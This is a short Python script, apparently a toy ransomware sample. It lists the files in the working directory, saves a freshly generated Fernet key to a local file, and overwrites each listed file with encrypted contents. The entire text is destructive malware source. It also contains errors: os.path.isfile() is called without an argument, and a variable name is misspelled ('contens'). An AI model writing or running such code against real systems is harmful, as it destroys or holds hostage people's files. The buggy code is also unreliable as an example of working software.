import os
from cryptography.fernet import Fernet

file_list = []

for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomDecrypted.py":
        continue
    if os.path.isfile():
        file_list.append(file)

print(file_list)

key = Fernet.generate_key()
print(key)

with open("generatedkey.key","wb") as generated_key:
    generated_key.write(key)

for file in file_list:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contens)
    with open(file,"wb") as the_file:
        the_file.write(contents_encrypted)


